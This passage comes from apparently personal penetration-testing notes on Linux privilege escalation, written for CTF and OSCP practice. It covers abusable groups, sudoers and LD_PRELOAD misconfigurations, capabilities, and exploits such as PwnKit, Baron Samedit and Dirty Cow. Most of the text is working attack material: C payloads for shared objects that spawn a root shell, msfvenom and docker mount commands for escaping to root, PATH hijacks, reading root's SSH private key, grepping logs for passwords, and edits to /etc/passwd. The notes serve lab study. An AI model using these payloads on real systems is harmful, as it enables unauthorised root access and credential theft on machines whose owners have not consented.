new config file)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <strong>ls</strong> readout can be cluttered, make sure you&#39;re not missing anything important!</p><p></p><p><span class="subheading">Example Usage</span>:</p><p></p><p><em>debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv </em></p><p></p><p>(In prompt)</p><p></p><p><em>ls /root/.ssh</em><em></em></p><p><em>cat /root/.ssh/id_rsa</em></p><p></p><p>Copy &amp; paste key to Attacker machine, chmod 600 id_rsa, &amp; use it. If there&#39;s no SSH for root, try <a href="PrivEsc--Linux_29.html#crack shadow">cracking </a><strong><a href="PrivEsc--Linux_29.html#crack shadow">/etc/shadow</a></strong>, look for more SNMP communities, etc.</p><p><h2></h2></p><p><h2></h2><a name="sudo group"></a>sudo</p><p>Allows a user to run <strong>sudo</strong> on the machine. For more information see the section on <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#sudo privs">sudo privileges</a>. You don&#39;t need to be in the <strong>sudo</strong> group to run <strong>sudo -l</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You may be able to specify / control an <a href="PrivEsc--Linux_29.html#sudo env var">Environment Variable</a> when running sudo.</p><p></p><p><h3>Uber Cheese</h3></p><p>Pre-requisite for <a href="PrivEsc--Linux_29.html#Uber Cheese">pkttyagent + SSH</a> PrivEsc.</p><p></p><p><h3>Bad sudoers Configuration</h3></p><p>Can grant additional privileges if the <strong>sudoers</strong> (or <strong>sudoers.d/</strong>) file is <a href="https://superuser.com/questions/1239818/difference-between-sudo-group-and-sudoers-file">setup</a> accordingly, containing a line like-</p><p></p><p><em>%sudo   ALL=(ALL:ALL) ALL</em></p><p><h2></h2></p><p><h2>lxd</h2></p><p>Related to containers, &amp; works with <strong>lxc</strong>. Various ways to use for root <a href="PrivEsc_8.html">PrivEsc</a>, even if host doesn&#39;t have an internet connection.</p><p></p><p><h2>lpadmin</h2></p><p>Allows members to manage printers and pending jobs sent by other users. Use <a href="https://www.computerhope.com/unix/ulpadmin.htm">l</a><em><a href="https://www.computerhope.com/unix/ulpadmin.htm">padmin</a></em> command to manage <a href="Recon_+_Services--IPP_(CUPS)_46.html">CUPS</a>.</p><p>Useful for Recon &amp; maybe phishing?</p><p></p><p><a name="docker PrivEsc"></a><h2>docker</h2></p><p>[CTF B 143]</p><p></p><p>Can run docker without sudo, letting you create containers for PrivEsc. </p><p></p><p>May be able to use a container that&#39;s currently downloaded, but you can upload your own container image if that doesn&#39;t work.</p><p></p><p><h3>Utilizing New Container</h3></p><p>After using one of the following methods to mount a new container, you&#39;ll be operating from inside that container. This could change the location of the Host&#39;s files.</p><p></p><p>For example, if you used <strong>docker run -v /:/mnt</strong>... The files from the Host OS may be inside <strong>/mnt</strong> &amp; the containers “empty” FS would be at <strong>/</strong>.</p><p></p><p>This <span style="color:#ff0000;">alters the results from enumeration</span> techniques. This can lead to inaccurate / incomplete results from tools like <strong>linpeas</strong>.</p><p></p><p>You won&#39;t find the Host&#39;s <span style="color:#ff0000;">Cron jobs</span> in the normal place, &amp; commands like <strong>netstat -tulpn</strong> won&#39;t show the Host&#39;s ports. You may also be missing some common binaries in the container.</p><p></p><p><span class="subheading">Workaround</span>: As root in the container, run <strong>chmod u+s /mnt/bin/bash</strong> &amp; then outside the container, run <strong>/bin/bash -p</strong>. Now you&#39;re root on the Host OS &amp; aren&#39;t inside the container. </p><p></p><p><h3>LotL</h3></p><p>If you can&#39;t spawn a root shell using one of the Exploit Payloads listed below, it may be because the container is setup for a different default user &amp;/or the image doesn&#39;t have <strong>chroot</strong> installed. The workaround addresses both of these issues.</p><p></p><p><span class="subheading">List Downloaded Images</span>:<em> docker image ls</em></p><p></p><p><span class="subheading">Exploit Workaround</span>: For example, the host has a container named <strong>shaker</strong> installed.</p><p></p><p><em>docker run -v /:/mnt --rm --user root:root -it shaker /bin/sh</em></p><p></p><p><h3>Load New Docker Image</h3></p><p><span class="subheading">Setup</span>: On the Attacker&#39;s machine, download &amp; package a container image. Next, transfer the TAR file to the target.</p><p></p><p><em>docker pull alpine:latest</em></p><p></p><p><em>docker save alpine -o alpine.tar</em></p><p></p><p><span class="subheading">Load Image</span>: On target, load the image &amp; run one of the example payloads.</p><p></p><p><em>docker load -i alpine.tar</em></p><p></p><p><h3>Exploit Payloads</h3></p><p>May need to adjust mount point?</p><p></p><p><em>docker run -it -v “/:/mnt/host” alpine /bin/sh</em></p><p></p><p><em>chroot /mnt/host</em>			(Can ignore errors like <strong>cat: /proc/7/comm. No such file or directory</strong>. You should have a root shell regardless.)</p><p></p><p><span class="subheading">Alternate Payload</span>: <em>docker run -it -v /:/host alpine:latest chroot /host/ bash</em></p><p></p><p><h2>video</h2></p><p>You have <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group">full control over the display</a>, so if other users are currently logged in, you can get a screenshot from their session.</p><p></p><p><h3>List Logged-in Users</h3></p><p><em>w</em><em></em></p><p><em></em></p><p><h2>adm</h2></p><p>This group is used for system monitoring tasks. Members of this group can read many log files in <strong>/var/log</strong>, and can use <strong>xconsole</strong>. Historically, <strong>/var/log</strong> was <strong>/usr/adm</strong> (and later <strong>/var/adm</strong>), thus the name of the group.</p><p></p><p><h3>Search for non-standard File Access</h3></p><p>Sometimes <span style="color:#ff0000;">also grants R/ access to files not in </span><strong><span style="color:#ff0000;">/var/log/</span></strong></p><p></p><p><em>find / -group adm -readable</em></p><p></p><p><h3>Search for Sensitive Info</h3></p><p>Linpeas can miss things, so you should also manually check for keywords. Remember to <span style="color:#ff0000;">check for other keywords</span> in addition to “password”!</p><p></p><p>You can use <strong>grep</strong> to recursively perform a case-insensitive search as follows.</p><p></p><p><em>grep -Ri &quot;password&quot; /var/log/</em></p><p></p><p><em>for i in $(find / -group adm -readable 2&gt;/dev/null); do grep -Ri &quot;password&quot; &quot;$i&quot;;done</em></p><p></p><p><a name="Sudoers File"></a><h1>Sudoers File</h1></p><p>For more information see the section on <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#sudo privs">sudo privileges</a>. You don&#39;t need to be in the <strong>sudo</strong> group to run <strong>sudo -l</strong></p><p></p><p>Check for <span style="color:#ff0000;">preserved Env Variables</span>, the PATH used &amp; the commands that you can run with sudo.</p><p></p><p>Can be setup to grant privileges to a user or a group (which would be specified with a line like <strong>%GROUP</strong>)</p><p></p><p><em>sudo -l</em></p><p></p><p><h2>Using Without a Password</h2></p><p>Sometimes can run this <span style="color:#ff0000;">without specifying a password</span>!</p><p></p><p>This is especially useful when you&#39;ve a Webshell as <strong>www-data</strong>, but it can be true for ANY user account.</p><p></p><p><h2>Write Privileges</h2></p><p>Target may use <strong>sudoers</strong> file, or a file in <strong>sudoers.d/</strong>.</p><p></p><p>If you have R/W Privs, you can give yourself permission to run ANY commands as root without a password.</p><p></p><p><a name="sudo env var"></a><h2>Sudo Environment Configuration</h2></p><p>The 1st line of output from <strong>sudo -l</strong> will show environment config when running commands with sudo.</p><p></p><p><h3>Writable PATH</h3></p><p>If sudo cmds use a PATH which contains a directory that you control, you can hijack the binary executed.</p><p></p><p><h3>Environment Variables</h3></p><p>If the sudoers file misconfigured, or if <strong>sudo -l</strong> specifies an Env Var to preserve with <strong><span style="color:#ff0000;">env_keep</span></strong>, you may be able to control the environment that the sudo command is executed in.</p><p></p><p>Alternatively, if it shows an entry with <strong><span style="color:#ff0000;">SETENV</span></strong> you can ALSO set your own Env Var the same way!</p><p></p><p><strong>(ALL) SETENV: NO PASSWD: /usr/bin/python3 /opt/backup.py</strong></p><p></p><p><span class="subheading">Set variable in command</span>: You may be able to set an Env Var in the sudo command, using the following syntax.</p><p></p><p><em>sudo </em><em><strong>http_proxy=</strong></em><em>VALUE wget &quot;http://stackoverflow.com&quot;</em></p><p></p><p><span class="subheading">Preserved from current session?</span>: There may be situations where a variable set with a previously executed <strong>export</strong> cmd will be used when running sudo. (I think, just speculating)</p><p></p><p><span style="color:#f6d32d;">★</span><span class="subheading">LD_PRELOAD Variable</span>: If you set this Env Var to the path of a shared object, that file will be loaded BEFORE any other library (including the C Runtime libc.so). See below for example usage.</p><p></p><p><h3>Example Exploitation</h3></p><p>Should be able to use msfvenom payload, or a payload that&#39;s manually compiled on the target.</p><p></p><p><em>sudo -l</em></p><p></p><p><strong>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, </strong><strong><span style="color:#ff0000;">env_keep</span></strong><strong>+=</strong><strong><span style="color:#ff0000;">LD_PRELOAD</span></strong></p><p></p><p><strong>(ALL:ALL) NOPASSWD: /usr/bin/sky_backup_utility</strong></p><p></p><p><span class="subheading">Msfvenom Payload</span>: <em>msfvenom -p linux/x64/exec CMD=&quot;/bin/bash -c &#39;chmod u+s /bin/bash&#39;&quot; -f elf-so -o root.so</em></p><p></p><p><span class="subheading">Manual Payload</span>: Compile on target with a cmd like- <strong>gcc -fPIC -shared -o root.so shell.c -nostartfiles</strong></p><p></p><p><strong>#include &lt;stdio.h&gt;</strong><strong></strong></p><p><strong>#include &lt;sys/types.h&gt;</strong><strong></strong></p><p><strong>#include &lt;stdlib.h&gt;void _init() {</strong><strong></strong></p><p><strong> unsetenv(&quot;LD_PRELOAD&quot;);</strong><strong></strong></p><p><strong> setgid(0);</strong><strong></strong></p><p><strong> setuid(0);</strong><strong></strong></p><p><strong> system(&quot;/bin/bash&quot;);</strong><strong></strong></p><p><strong>}</strong></p><p></p><p><span class="subheading">Trigger Exploit</span>: Set the <strong>LD_PRELOAD</strong> variable that&#39;s been preserved with <strong>env_keep</strong>.</p><p></p><p><em>sudo LD_PRELOAD=/tmp/root.so /usr/bin/sky_backup_utility</em></p><p></p><p><h2>Run As...</h2></p><p>By default, <strong>sudo</strong> lets you run commands as root on the current host.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You&#39;re sometimes able to run <strong>sudo -l</strong> without providing a password, letting you run it on accounts even if you don&#39;t know there password. </p><p></p><p><h3>Another User</h3></p><p><em>sudo -u bob</em></p><p></p><p><h3>Another Group</h3></p><p><em>sudo -g docker</em></p><p></p><p><h3>Another Host</h3></p><p>[CTF 180, OSCP 157]</p><p>The sudoers file can reference another host, for example the following means that the user “bob” can run that command on the “host2” machine.</p><p></p><p><strong>bob host2 = (root) NOPASSWD: /bin/bash</strong></p><p></p><p><em>sudo -h host2</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Can&#39;t this still be leveraged to <span style="color:#ff0000;">execute commands on the current machine</span>? See the pages numbers referenced above.</p><p></p><p><h1>Capabilities</h1></p><p>Can be leveraged for PrivEsc &amp;/or Container Escape.</p><p></p><p>If you get an unexpected permission error, check for <a href="PrivEsc--Linux_29.html#Bypass AppArmor">AppArmor</a> restrictions.</p><p></p><p><h2>Enumerate Capabilities</h2></p><p>[OSCP 158]</p><p>May be able to transfer these tools to target machine if needed.</p><p></p><p><h3>For Binaries</h3></p><p><em>getcap -r / 2&gt;/dev/null</em></p><p></p><p>If it&#39;s not in PATH, locate this tool with-</p><p></p><p><em>find / -name “getcap” 2&gt;/dev/null</em></p><p></p><p><h3>For Processes</h3></p><p><span class="subheading">capsh</span>: Not installed by def. Lists all process capabilities &amp; decodes them. <em>capsh --print</em></p><p></p><p><span class="subheading">Manually</span>: List bitmasks from target machine, &amp; then copy/paste them 1 at a time to decode them on attacker&#39;s machine.</p><p></p><p><strong>{Target}</strong> <em>cat /proc/self/status | grep -i &quot;cap&quot;</em></p><p><strong>{Attacker}</strong> <em>capsh --decode=</em>000001ffffffffff</p><p></p><p><h2>All Capabilities (</h2><strong><h2>=ep</h2></strong><h2>)</h2></p><p>[OSCP 195-196]</p><p>See above page for details, including potential limitations &amp; for example exploitation.</p><p></p><p><strong><span style="color:#ff0000;">=ep</span></strong> colloquially referred to as “Empty Capabilities” (a misnomer), but <span style="color:#ff0000;">functions the same as </span><strong><span style="color:#ff0000;">all=ep</span></strong>. It means <span style="color:#ff0000;">ALL Capabilities</span> are present.</p><p></p><p><h3>Exploitation</h3></p><p><span style="color:#ff0000;">Any Capability based PrivEsc methods</span> for a binary with <strong>=ep</strong> or<strong> all=ep</strong> may be used, since this represents all capabilities (e.g PrivEsc method for <strong>cap_setuid+ep</strong>)</p><p></p><p><span class="subheading">GTFOBins Warning</span>: GTFOBins has a “Capabilities” section for some binaries, but it&#39;s <span style="color:#ff0000;">incomplete</span> (e.g nothing listed for openssl). Some GTFOBins PrivEsc methods (e.g SUID &amp; sudo) are interchangable, but not always the case (especially for capabilities).</p><p></p><p><h2>OpenSSL (cap_setuid+ep)</h2></p><p>See this <a href="https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/openssl-privilege-escalation">guide</a>, but I had to add another Library to the payload.</p><p></p><p>The <strong>#include &lt;unistd.h&gt;</strong> header is necessary for system calls like setuid and setgid. These functions are part of the POSIX API and are used to set the user ID and group ID, respectively.</p><p></p><p>Without it, compiling this payload fails with the following errors.</p><p></p><p><em>gcc -fPIC -o openssl.o -c openssl.c</em></p><p><strong>openssl.c: In function ‘bind’:</strong><strong></strong></p><p><strong>openssl.c:4:5: error: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]</strong><strong></strong></p><p><strong>    4 |     setuid(0); setgid(0);</strong><strong></strong></p><p><strong>      |     ^~~~~~</strong><strong></strong></p><p><strong>openssl.c:4:16: error: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]</strong><strong></strong></p><p><strong>    4 |     setuid(0); setgid(0);</strong></p><p></p><p><h3>Setup</h3></p><p>On the Attacker machine, install <strong>libssl-dev</strong> to use the header file named <strong>openssl/engine.h </strong>in the exploit if it isn&#39;t already installed.</p><p></p><p><em>sudo apt install libssl-dev</em></p><p></p><p><span class="subheading">Payload</span>: Create payload on Attacker machine with the<strong> .c</strong> file extension (e.g. <strong>evil.c</strong>)</p><p></p><p><strong>#include &lt;unistd.h&gt;</strong></p><p><strong>#include &lt;openssl/engine.h&gt;</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>static int bind(ENGINE *e, const char *id) {</strong><strong></strong></p><p><strong>    setuid(0); setgid(0);</strong><strong></strong></p><p><strong>    system(&quot;/bin/bash&quot;);</strong><strong></strong></p><p><strong>}</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>IMPLEMENT_DYNAMIC_BIND_FN(bind)</strong><strong></strong></p><p><strong>IMPLEMENT_DYNAMIC_CHECK_FN()</strong></p><p></p><p><span class="subheading">Compile</span>: Compile on your machine using <a href="Exploit_Research--Compiling_Code_32.html#gcc static & shared">shared</a> Library (effectively making it a static binary).</p><p></p><p><em>gcc -fPIC -o openssl.o -c openssl.c</em></p><p></p><p><em>gcc -shared -o openssl.so -lcrypto openssl.o</em></p><p></p><p><h3>Exploitation</h3></p><p>On the Target machine, specify the path to the OpenSSL binary which has the <strong>cap_setuid</strong> capability &amp; have it use the <strong>.so</strong> file you compiled.</p><p></p><p><em>/usr/bin/openssl req -engine /tmp/openssl.so</em></p><p><h1></h1></p><p><h1>Kernel Exploits</h1></p><p>See notes on <a href="Exploit_Research--Compiling_Code_32.html#Kernel Exploit Compilation">compiling kernel exploits</a> if you need static compilation &amp; the target is throwing errors like <strong>&#39;GLIBC_2.34&#39; not found</strong>.</p><p></p><p>Some exploits <span style="color:#ff0000;">ONLY work from a stabilized shell</span> (e.g. use SSH or run python shell stabilzing command)!</p><p></p><p><a name="Sudo Baron Samedit"></a><h2>sudo Baron Samedit</h2></p><p>Various ranges of vuln sudo versions. </p><p>For ex, Exploit-DB PoC states, &quot;It affects Sudo legacy versions from<span style="color:#ff0000;"> 1.8.2 to 1.8.31p2</span>, stable versions from <span style="color:#ff0000;">1.9.0 to 1.9.5p1</span>&quot;</p><p></p><p>Target needs some C compiler (e.g <strong>gcc</strong> or <strong>gcc-9</strong>). If they don&#39;t have <strong>make</strong>, just manually follow those steps with the compiler.</p><p></p><p><h3>PoC</h3></p><p>Use this spicy <a href="file:///home/asura/sploits/linux/sudo_Baron_Samedit/nu11secur1ty_1.31.2021">PoC</a>. <span style="color:#ff0000;">May need to use diff PoC for other targets, but it may work on targets that it doesn&#39;t explicitly mention</span> (e.g Ubuntu 20.04.5 with sudo 1.8.31 could use either 0 or 1)</p><p>The listed targets are-</p><p></p><p> 0) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31</p><p> </p><p> 1) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28</p><p></p><p>Can check with <em>lsb_release -a</em>		(But try this PoC even if it&#39;s a different release)</p><p></p><p><span class="subheading">Steps</span></p><p>A) Transfer directory to target (need to <a href="Exploit_Research--Compiling_Code_32.html">compile</a> on target system)</p><p></p><p>B) Nav to its dir &amp; <em>make</em></p><p></p><p>C) <em>./sudo-hax-me-a-sandwich</em> <strong>0</strong> 	(Specify either 0 or 1. Use without arg to list targets)</p><p></p><p>D) Stabilize: <em>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</em></p><p></p><p><h3>Other PoCs</h3></p><p>These haven&#39;t been working for me!</p><p></p><p>Most PoCs will replace a file (usually <strong>/etc/passwd</strong> ) with a source file. They&#39;ll take an arg for the malicious source file, &amp; sometimes you need to specify target file as well.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: IRL, It&#39;s good idea to keep an unedited copy of <strong>/etc/passwd</strong> to make it easier to revert if something goes wrong!</p><p></p><p>Replace UID &amp; GID of target user with 0 to give them root access (or make a new root user)</p><p></p><p><em>cp /etc/passwd ./evil_passwd</em><em></em></p><p><em>sed -i &#39;s/anita:x:1004:1004/anita:x:0:0/g&#39; ./evil_passwd</em></p><p></p><p><h2>Pwnkit / Pkexec / Polkit (CVE-2021-4034)</h2></p><p>[OSCP 192]</p><p></p><p>See <a href="file:///home/asura/git/CVE-2021-4034">PoC</a></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can ignore the compilation errors, like a true programmer.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: The static version works inconsitently. Is this because of the target Archor the version of certain SW that&#39;s installed?</p><p></p><p><h3>Compile on Target</h3></p><p><span style="color:#f6d32d;">★</span>Sometimes the Statically Compiled version works, but other times you <span style="color:#ff0000;">need to COMPILE IT ON TARGET</span>!</p><p></p><p>If the target doesn&#39;t have <strong>make</strong> installed, but it does have some variant of <strong>gcc</strong>, you can just manually run the commands from the Makefile.</p><p></p><p>When compiling it&#39;ll probably throw errors like the following, but you can ignore them like a true programmer.</p><p></p><p><strong>evil-so.c: In function &#39;gconv_init&#39;:</strong><strong></strong></p><p><strong>evil-so.c:10:5: warning: implicit declaration of function &#39;setgroups&#39; [-Wimplicit-function-declaration]</strong><strong></strong></p><p><strong>     setgroups(0);</strong><strong></strong></p><p><strong>     ^</strong><strong></strong></p><p><strong>evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]</strong><strong></strong></p><p><strong>     execve(&quot;/bin/sh&quot;, NULL, NULL);</strong><strong></strong></p><p><strong>     ^</strong><strong></strong></p><p><strong>gcc exploit.c -o exploit</strong><strong></strong></p><p><strong>exploit.c: In function &#39;main&#39;:</strong><strong></strong></p><p><strong>exploit.c:25:5: warning: implicit declaration of function &#39;execve&#39; [-Wimplicit-function-declaration]</strong><strong></strong></p><p><strong>     execve(BIN, argv, envp);</strong></p><p></p><p><a name="static pwnkit"></a><h3>Static Compilation</h3></p><p>If this fails (e.g. throws error <strong>bash: ./exploit: cannot execute binary file: Exec format error</strong>), may need to compile it on the target!</p><p></p><p>Use a <a href="Exploit_Research--Compiling_Code_32.html#gcc static & shared">combination of static and shared libraries</a> to execute this PoC on a target w/o a compiler.</p><p></p><p><em>gcc -static ~/git/CVE-2021-4034/exploit.c -o exploit</em><em></em></p><p><em>gcc -shared -o evil.so -fPIC ~/git/CVE-2021-4034/evil-so.c</em></p><p></p><p>Upload both to target &amp; run-</p><p></p><p><em>chmod 777 exploit evil.so</em></p><p><em>./exploit</em></p><p></p><p><h2>Dirty Sock</h2></p><p>Not to be confused with Dirty Cow! CVE-2019-7304 works by exploiting <strong>Snapd</strong> &lt; <span style="color:#ff0000;">version 2.37</span>. Regardless of what tools like Linpeas say, check the installed version with the following command.</p><p></p><p><em>snap version</em></p><p></p><p><h3>Exploitation</h3></p><p>Exploit-db has 2 versions of the Dirty Sock exploit, which are described as follows:</p><p><ol><li>For “most use cases.” I believe it connects to the attacker&#39;s SSH server as root.</li></ol></p><p><ol><li>For “special use cases.” It creates a new user (<strong>dirty_sock</strong>:<strong>dirty_sock</strong>) with unlimited sudo privs. This is the version that&#39;s <span style="color:#ff0000;">worked best for me</span> so far! Example usage is as follows:</li></ol></p><p></p><p><em>python3 ./46362.py</em></p><p></p><p><em>su dirty_sock</em></p><p></p><p><em>sudo /bin/bash -p</em></p><p></p><p><h2>Dirty Cow</h2></p><p>There are multiple versions of the exploit for both <strong>dirtycow</strong> &amp; <strong>dirtycow 2</strong>. Some may work better than others.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Will fail unless run from a <span style="color:#ff0000;">stabilized shell</span>! Use the specially compiled exploit saved in <strong>/var/lib/machines/DirtyCow/root</strong> (Must be root to see that this directory even exists)</p><p></p><p></p><p><h1>Exploitable Binaries</h1></p><p><h2>Text Editors / Pagers</h2></p><p>Text Editors like <strong>vi</strong> / <strong>vim</strong> &amp; file pagers like <strong>less</strong> often support built-in commands. If you&#39;re able to run these with elevated privileges (e.g. with sudo), you can get RCE as that account.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You may also be able to combine it with the <a href="PrivEsc--Linux_29.html#sudo bypass">sudo security policy bypass</a>.</p><p></p><p><em>sudo vi -c ‘:/bin/sh’ /dev/null</em></p><p></p><p><h3>Restricted sudo Command</h3></p><p>[CTF B 176-177]</p><p></p><p>If you can&#39;t run the binary with arguments, you can run it normally but execute the commands inside the text editor instead.</p><p></p><p>This works best if you&#39;ve got a very stable shell (e.g. SSH or VNC), but may / may not work if that&#39;s not possible.</p><p></p><p>For example, if using <strong>vi</strong>, hit <strong>Esc</strong> &amp; enter <strong>:!/bin/sh</strong>.</p><p></p><p><h2>sudo</h2></p><p><a name="sudo bypass"></a><h3>CVE-2019-14287 (&lt; 1.8.28)</h3></p><p>Affects sudo versions <strong>&lt; 1.8.28</strong>. <a href="https://www.exploit-db.com/exploits/47502">Bypasses security policies</a>, allowing user to run arbitrary commans as root even if they shouldn&#39;t be allowed to do so. More details available <a href="https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/">here</a>.</p><p></p><p>In the following example, the user is allowed to run this sudo command as any user EXCEPT root</p><p></p><p><em>sudo -l</em></p><p></p><p><strong>Matching Defaults entries for gwendoline on year-of-the-rabbit:</strong><strong></strong></p><p><strong>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>User gwendoline may run the following commands on year-of-the-rabbit:</strong><strong></strong></p><p><strong>    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt</strong></p><p>    </p><p><span class="subheading">Security Bypass</span>: When specifying a user for sudo, use the UID <strong>-1</strong> (with <strong>#</strong> prepended to it). As a result, sudo will run the command as UID 0 (aka root). <span style="color:#ff0000;">No space</span> after <strong>sudo -u</strong>.</p><p></p><p>In the following example, <strong>vi</strong> is launched as root, &amp; a shell can then be spawned from within the <strong>vi</strong> pager with <strong>ESC</strong> → <strong>:!/bin/sh</strong>.</p><p></p><p><em>sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You may / may not be able to test a machine for this vulnerability by running <strong>sudo -u#-1 id -u</strong>. If you&#39;re root, the output should be 0.</p><p></p><p><h3>sudo Baron Samedit</h3></p><p>See <a href="PrivEsc--Linux_29.html#Sudo Baron Samedit">section</a> for more details. Affects sudo versions <strong>1.8.2 </strong>to <strong>1.8.31p2,</strong> stable versions from <strong>1.9.0</strong> to <strong>1.9.5p1</strong></p><p></p><p><h2>sudoedit</h2></p><p>[CTF B 182]</p><p></p><p>Designed to safeguard against normal means of exploitation, but may still be vuln depending on the version of sudo used.</p><p></p><p>For example, the following permission may only be exploitable depending on the sudo version that the Host uses; even though you&#39;d be able to use <a href="PrivEsc--Linux_29.html#Wildcard Dir Trav">Dir Trav exploit</a> for other binaries.</p><p></p><p><em>sudo -l</em></p><p><strong>(ALL : ALL) /usr/bin/sudoedit /var/www/html/*/*/config.php</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If Wildcards are used in the file path, youmay need to create those subdirectories so there&#39;ll be a valid file path (if you don&#39;t have the perms, create them using a user account which does).</p><p></p><p><h3>CVE-2023-22809 (sudo 1.8.0 - 1.9.12p1)</h3></p><p>The only requirement for the Exploit-db <a href="https://www.exploit-db.com/exploits/51217">PoC</a> is that the current user can run <strong>sudoedit</strong> as root.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: After running PoC, it may use <strong>vim</strong> as the Text-Editor, &amp; it may take ~3 attempts to exit it &amp; spawn the root shell. Use <strong>:wq</strong>, hit <strong>Enter</strong> by itself, &amp; repeat as needed.</p><p></p><p><span class="subheading">How it Works</span>: This PoC edits the target&#39;s <strong>/etc/sudoers</strong> file. For example, if your username is curtis:</p><p><ol><li>Look for the line: <strong>root ALL = (ALL) ALL</strong></li></ol></p><p><ol><li>Below that line, add: <strong>curtis ALL = (ALL) ALL</strong></li></ol></p><p><ol><li>Run any command as root with sudo (e.g. <strong>sudo /bin/bash -p</strong>)</li></ol></p><p></p><p><h3>CVE-2015-5602 (sudo &lt; 1.8.15)</h3></p><p>Requires that the user can run <strong>sudoedit</strong> on a <span style="color:#ff0000;">file path which contains wildcards</span> (see the example above).</p><p><ol><li><strong>Create File Path</strong>: If the file path specified with the wildcards doesn&#39;t exist, you&#39;ll need to <span style="color:#ff0000;">create those parent directories</span> (<span style="color:#ff0000;">don&#39;t need the file to exist</span>). I needed to switch to a diff account which had the necessary perms to do so.</li></ol></p><p></p><p><em>mkdir -p /var/www/html/test1/test2</em></p><p><ol><li><strong>Create Symlink</strong>: Using an account which has the permission to create a file in the specified path, create a symbolic link to exploitable file (i.e. <strong>/etc/passwd</strong>). You&#39;ll be able to R/W to that file using <strong>sudoedit</strong>.</li></ol></p><p></p><p><em>ln -s /etc/passwd /var/www/html/test1/test2/config.php</em></p><p><ol><li><strong>Edit File</strong>: Leverage R/W access to, for example, <strong>/etc/passwd</strong> to create a new root user using <a href="PrivEsc--Linux_29.html#Writable /etc/passwd">normal methods</a> (but you&#39;re editing it via the symlink). See Troubleshooting below for example.</li></ol></p><p></p><p><span class="subheading">Troubleshooting</span>: Try running <strong>sudoedit</strong> with &amp; w/o <strong>sudo</strong>. It only worked for me when I didn&#39;t use <strong>sudo</strong>, but that wasn&#39;t the case for others so IDK. Even w/o <strong>sudo</strong>, <strong>sudoedit</strong> still pretended I was root. For example,</p><p></p><p><em>/usr/bin/sudoedit /var/www/html/test1/test2/config.php</em></p><p></p><p><em>sudo /usr/bin/sudoedit /var/www/html/test1/test2/config.php</em></p><p></p><p><h2>shutdown</h2></p><p>If <strong>shutdown</strong> can be run with elevated privileges (i.e. <strong>sudo</strong>), it may be <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/">vuln</a>. It sometimes uses a relative path to invoke the <strong>poweroff</strong> binary, which you can hijack.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Idk if this is just an old version of <strong>shutdown</strong>, but it&#39;s referenced in articles making me doubt that this is a custom version of the binary. Didn&#39;t work on my machine.</p><p></p><p><em>sudo -l</em></p><p></p><p><strong>(root) NOPASSWD: /usr/bin/shutdown</strong></p><p></p><p><em>cd /tmp; echo /bin/bash &gt; poweroff; chmod 777 poweroff; export PATH=/tmp:$PATH; sudo /usr/bin/shutdown</em></p><p></p><p><a name="Bypass AppArmor"></a><h1>Bypass AppArmor</h1></p><p>[CTF B 138]</p><p></p><p><h2>Troubleshoot Permission Error</h2></p><p>If you&#39;re using a <span style="color:#ff0000;">fully stabilized shell</span> &amp; see an unexpected permission error (like the one <a href="PrivEsc--Linux--Stabilize_Shell_34.html#stabilization required">here</a>),  you can attempt the following steps (the last of which is for AppArmor). </p><p></p><p>For example, the <strong>/usr/bin/ruby2.5 </strong>has the <strong>cap_setuid+ep</strong> Capability, &amp; you attempt to PrivEsc &amp; get the following error:</p><p></p><p><em>/usr/bin/ruby2.5 -e ‘Process::Sys.setuid9)0; exec “/bin/bash”’</em></p><p></p><p><strong>‘exec’: Permission Denied /bin/bash (Errno::EACCESS)</strong></p><p></p><p><h3>Rule out Possible Issues</h3></p><p>In this example, some of these steps check<strong> </strong>the binary with the capabilities (<strong>/usr/bin/ruby2.5 </strong>) &amp; others check the binary that it is executing (<strong>/bin/bash</strong>).</p><p></p><p>If there is an issue with the latter, the solution may be as simple as subsituting it for an alternative, like <strong>/bin/sh</strong>.</p><p></p><p><span class="subheading">Binary ACL</span>: Verify that the target binary can be executed. Any of the following should work?</p><p></p><p><em>getfacl /bin/bash</em><em></em></p><p><em></em><em></em></p><p><em>stat /bin/bash</em><em></em></p><p><em></em><em></em></p><p><em>ls -l /bin/bash</em></p><p></p><p><span class="subheading">Examine Execution</span>: Run with <strong>strace</strong> &amp; <strong>ltrace</strong> (last resort).</p><p></p><p><span class="subheading">Check Executed Binary</span>: See if there are any related to the binary you&#39;re executing.</p><p></p><p><em>find / -iname 